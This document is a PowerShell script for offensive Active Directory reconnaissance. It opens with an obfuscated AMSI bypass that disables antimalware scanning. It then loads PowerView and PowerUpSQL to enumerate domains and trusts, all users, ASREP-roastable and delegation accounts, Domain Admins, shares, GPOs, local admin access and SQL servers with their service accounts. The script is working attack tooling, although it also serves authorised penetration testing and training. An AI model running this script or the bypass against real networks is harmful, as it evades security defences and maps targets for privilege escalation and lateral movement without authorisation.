
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"(${nULl},${tRuE} )

Import-Module  .\Microsoft.ActiveDirectory.Management.dll
Import-PowershellDataFile .\ActiveDirectory.psd1
Import-Module .\Find-PSRemotingLocalAdminAccess.ps1
Import-Module .\PowerView.ps1
Import-Module .\PowerView_dev.ps1
Import-Module .\PowerupSQL.ps1

Write-Output "+========================================+";
Write-Output "           [+] Domain Enumeration        ";
Write-Output "+========================================+";
Write-Output "   [1] Forest Information :";
Get-ADForest | select Name
Write-Output "   [2] Domains of the Current Forest :";
Get-NetForestDomain | select Name,Parent,DomainControllers
#Get-ADForest | select domains
Write-Output "   [3] Current Domain Information :";
Get-ADDomain | select Name,DomainSID,Forest,ParentDomain,DistinguishedName,DomainMode
Write-Output "   [4] Child Domains Information:";
Get-ADDomain | select ChildDomains
Write-Output "   [5] Trusts of the Current Domain :";
Get-NetDomainTrust
Write-Output "   [6] Map Domain Trust :";
Invoke-MapDomainTrust | select SourceName,TargetName,TrustDirection

Write-Output "+========================================+";
Write-Output "           [+] Users Enumeration        ";
Write-Output "+========================================+";
Write-Output "   [1] All users :";
get-aduser -filter * -Properties * | Select Description, samaccountname
Write-Output "   [2] Unconstrained Delegation on Users :";
Get-ADUser -Filter {TrustedForDelegation -eq $True}
Write-Output "   [3] ASREPRoastable Users :";
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth  | select SamAccountName,SID,DistinguishedName
Write-Output "   [4] Kerberoastable Users :"
#Get-ADUser -filter {ServicePrincipalName -like "*"} -property serviceprincipalname | select SamAccountName,SID,DistinguishedName


Write-Output "+========================================+";
Write-Output "           [+] Computers Enumeration        ";
Write-Output "+========================================+";
Write-Output "   [1] Computers :";
get-adcomputer -filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address
Write-Output "   [2] Computers (Live Hosts) :";
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} | select IPV4Address
Write-Output "   [3] Unconstrained Delegation on Computers :";
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select SamAccountName,DNSHostName
Write-Output "   [4] Find Users in the Current Domain that Reside in Groups Across a Trust :";
Find-ForeignUser
Write-Output "   [5] Find Users with AdminCount = 1:";
Get-NetUser -AdminCount | select samaccountname,serviceprincipalname,objectsid

Write-Output "+========================================+";
Write-Output "           [+] Groups Enumeration        ";
Write-Output "+========================================+";
Write-Output "   [1] All Groups :";
Get-ADGroup -Filter * | select Name
Write-Output "   [2] Groups Contain Admin Word :";
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
Write-Output "   [3] Members of Domain Admins Group : ";
Get-ADGroupMember -Identity "Domain Admins" -Recursive | select SamAccountName,SID,DistinguishedName

Write-Output "+========================================+";
Write-Output "           [+] OUs Enumeration        ";
Write-Output "+========================================+";
Write-Output "   [1] All OUs : ";
Get-ADOrganizationalUnit -Filter * | select Name

Write-Output "+========================================+";
Write-Output "           [+] Shares Enumeration        ";
Write-Output "+========================================+";
Write-Output "   [1] Shares :";
Invoke-ShareFinder 

#Write-Output "+========================================+";
#Write-Output "           [+] ACLs Enumeration            ";
#Write-Output "+========================================+";
#Write-Output "   [1] Find Interesting ACLs:";
#Invoke-ACLScanner -ResolveGUIDs | select ActiveDirectoryRights, IdentityReference, objectDN | fl

Write-Output "+========================================+";
Write-Output "           [+] GPOs Enumeration            ";
Write-Output "+========================================+";
Write-Output "   [1] All GPOs :";
Get-NetGPO | select displayname

Write-Output "+========================================+";
Write-Output "  [+] Logon and Sessions Enumeration      ";
Write-Output "+========================================+";
Write-Output "   [1] Finding Local Admin Access :";
Find-PSRemotingLocalAdminAccess
#Write-Output "   [2] DA Sessions :";
##Find-DomainUserLocation -Verbose
#Invoke-UserHunter -CheckAccess | select UserName, ComputerName, IPAddress, SessionFrom, LocalAdmin | fl

Write-Output "+========================================+";
Write-Output "       [+] Database Enumeration      ";
Write-Output "+========================================+";
Write-Output "   [1] Finding SQL Servers :";
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
Write-Output "   [2] Extracting Information of Accessible SQL Servers :";
Get-SQLInstanceDomain | Get-SQLServerinfo | select ComputerName,DomainName,ServiceName,ServiceAccount,SQLServerEdition,Currentlogin,IsSysadmin
